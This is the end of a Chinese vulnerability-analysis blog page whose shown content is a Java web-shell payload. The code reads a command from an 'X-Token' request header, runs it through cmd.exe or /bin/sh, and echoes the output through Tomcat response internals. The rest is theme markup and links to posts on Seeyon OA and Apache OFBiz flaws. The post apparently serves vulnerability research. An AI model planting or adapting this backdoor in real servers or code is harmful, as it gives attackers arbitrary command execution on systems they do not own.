+<div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">Object</span> req = Util.getNeededRequestObject();
+<span class="hljs-keyword">Object</span> resp = req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);
+String <span class="hljs-keyword">header</span> = (String) req.getClass().getMethod(&quot;getHeader&quot;, String.<span class="hljs-keyword">class</span>).invoke(req, &quot;X-Token&quot;);
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">header</span> != <span class="hljs-keyword">null</span> &amp;&amp; !<span class="hljs-keyword">header</span>.isEmpty()) &#123;
+	String[] cmd = <span class="hljs-keyword">null</span>;
+	String os = <span class="hljs-keyword">System</span>.getProperty(&quot;os.name&quot;).toLowerCase();
+	<span class="hljs-keyword">if</span> (os.contains(&quot;win&quot;)) &#123;
+		cmd = <span class="hljs-built_in">new</span> String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, <span class="hljs-keyword">header</span>&#125;;
+	&#125; <span class="hljs-keyword">else</span> &#123;
+		cmd = <span class="hljs-built_in">new</span> String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, <span class="hljs-keyword">header</span>&#125;;
+	&#125;
+	String result = <span class="hljs-built_in">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
+	// doWrite
+	resp.getClass().getMethod(&quot;setStatus&quot;, <span class="hljs-type">Integer</span>.<span class="hljs-keyword">TYPE</span>).invoke(resp, <span class="hljs-number">200</span>);
+	try &#123;
+		resp.getClass().getDeclaredMethod(&quot;doWrite&quot;, java.nio.ByteBuffer.<span class="hljs-keyword">class</span>).invoke(resp, java.nio.ByteBuffer.wrap(result.getBytes()));
+	&#125; catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;
+		<span class="hljs-keyword">Class</span> clazz = <span class="hljs-keyword">Class</span>.forName(&quot;org.apache.tomcat.util.buf.ByteChunk&quot;);
+		<span class="hljs-keyword">Object</span> byteChunk = clazz.newInstance();
+		clazz.getDeclaredMethod(&quot;setBytes&quot;, byte[].<span class="hljs-keyword">class</span>, <span class="hljs-type">Integer</span>.<span class="hljs-keyword">TYPE</span>, <span class="hljs-type">Integer</span>.<span class="hljs-keyword">TYPE</span>).invoke(byteChunk, result.getBytes(), <span class="hljs-number">0</span>, result.getBytes().length);
+		resp.getClass().getMethod(&quot;doWrite&quot;, clazz).invoke(resp, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;byteChunk&#125;);
+	&#125;
+&#125;</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204192352464.png" srcset="/img/loading.gif" lazyload> </p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="category-chain-item">漏洞分析</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Seeyon%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/" title="致远OA系列漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">致远OA系列漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-OFbiz%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/" title="Apache-OFbiz系列漏洞">
+                        <span class="hidden-mobile">Apache-OFbiz系列漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
